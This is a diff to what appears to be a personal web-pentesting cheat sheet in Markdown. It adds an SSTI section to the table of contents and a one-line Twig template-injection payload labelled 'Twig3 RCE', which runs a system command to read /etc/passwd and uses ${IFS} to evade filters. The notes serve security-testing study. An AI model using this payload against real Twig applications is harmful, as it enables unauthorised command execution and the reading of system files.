@@ -11,6 +11,7 @@ for my private purposes :)
    + [XXE](#xxe)
    + [LFI](#lfi)
    + [ESI](#esi)
+   + [SSTI](#ssti)
    + [Request Smuggling](#request-smuggling)
    + [Hackvertor](#hackvertor)
    + [SQL Injection](#sql-injection)
@@ -125,7 +126,13 @@ XSS
  - https://twitter.com/alxbrsn/status/981256374230319112
  - https://t.co/XRxIalWcng?amp=1 
  - https://t.co/vzRIo3RuaR?amp=1
- - https://www.slideshare.net/cisoplatform7/edge-side-include-injection-abusing-caching-servers-into-ssrf-and-transparent-session-hijacking
+ - https://www.slideshare.net/cisoplatform7/edge-side-include-injection-abusing-caching-servers-into-ssrf-and-transparent-session-hijacking  
+ 
+ ### SSTI  
+ Twig3 RCE:  
+```
+{{['cat${IFS}/etc/passwd']|filter('system')}}
+```
  
  ### Request Smuggling  
  TE.CL + Hackvertor  
